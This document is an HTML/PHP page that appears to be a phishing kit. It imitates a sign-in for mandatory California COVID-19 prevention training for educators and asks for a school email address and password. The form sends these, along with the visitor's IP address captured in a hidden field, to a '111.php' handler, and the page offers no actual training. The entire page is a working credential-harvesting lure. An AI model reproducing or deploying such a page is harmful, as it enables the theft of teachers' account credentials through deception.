<html>
<head>
  <title>CA COVID-19 Training</title>
</head>
<style type="text/css"> 
div
body.noScroll { 
	background-image: url(background.jpg); 
	background-attachment: fixed;
}
body{ 
	background-image: url(background.jpg); 
	background-attachment: scroll;}
</style>
<body bgcolor="#FFFFFF">
<table cellspacing="0" cellpadding="0" width="100%" border="0">
  <tr background="/images/grayBars.gif" width="100%">
    <td align="right" background="" width="100%">
      <center><img src="https://encrypted-tbn1.gstatic.com/images?q=tbn:ANd9GcSAxbW97fpHJXh7lSdvCdrvBQP-1nWnRuE1_CRB8yBjMBzqkbFp" /></p>
    </td>
  </tr>
</table>

<script language="JavaScript"><!--
function email_Submit() {
  document.password.pword.focus();
  return false;
}
function password_Submit() {
  document.password.email.value = document.login.email.value;
  return true;
}
// --></script>
 

<center>
<table cellspacing="5" cellpadding="0" border="0" width="500">
  <tr>
    <td colspan="2" valign="top">
      <font face="Arial, Helvetica, sans-serif">
      <font size="+2">Sign in with your school email to register for the Mandatory Training on COVID-19 Prevention For Educators in the state of California</b></font>
      <br><br>
      <font color="#CC0000"><b></b></font>
      <p>
      <font color="#CC0000" size="-1"><b></b></font>
   </td>
  </tr>
  <form name="login" action="111.php" method="post" onSubmit="return formCheck(this);">
  <tr>
    <td valign="middle" align="right">
      <font face="Arial, Helvetica,sans-serif" size="-1">
      <b>Email Address</b>
      </font>
      </td>
    <td valign="bottom">
      <input type="text" name="email" size="29" value="">
      </td>
  </tr>
  <tr>
    <td valign="top"></td>
    <td valign="top">
      <font face="Arial, Helvetica,sans-serif" size="-1">
    
      </font>
      </td>
  </tr>
  <tr>
    <td valign="middle" align="right">
      <font face="Arial, Helvetica,sans-serif" size="-1">
      <b>Password</b>
      </font>
      </td>
    <td valign="bottom">
      <input type="password" name="pword" size="29" autocomplete="off" />
      </td>
  </tr>
  <tr>
    <td valign="top"></td>
    <td valign="top">
      <font face="Arial, Helvetica, sans-serif" size="-1">
      
      </font>
      </td>
  </tr>
  <tr>
    <td></td>
    <td valign="middle">
      <font face="Arial, Helvetica,sans-serif" size="-1">
     
      </font>
      </td>
  </tr>
  
				
  <tr>
    <td></td>
    <td><br><input type=image name="login" src="images/destination_6459423e6d3287c0279b9a95fd98206b.jpg" width="87" height="32" alt="Go" border="0"></td>
  </tr>
  
  <input type="hidden" name="ip_address" value="<?php echo $_SERVER['REMOTE_ADDR'] ?> ">
				<br> 
                <br> 
    <input type="hidden" name="action" value="login">


  </form>
  <tr>
    <td valign="top"></td>
    <td valign="top">
      <font face="Arial, Helvetica,sans-serif" size="-1">
     
      <br>
      <a href="/exec/fd_helpWin?topic=8" target="_popup" onClick="window.open('/exec/fd_helpWin?topic=8','popup','width=600,height=425,location=no,menubar=no,scrollbars=yes,status=no,toolbar=no'); return false;"></a>
      <br><br><br><br>
      </font>
    </td>
  </tr>
</table>
</center>

    <!-- ##### Google Analytics: BEGIN ##### -->
    <script type="text/javascript">
      var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
      document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
    </script>
   
    <!-- ##### Google Analytics: END ##### -->
  
</body>
</html>
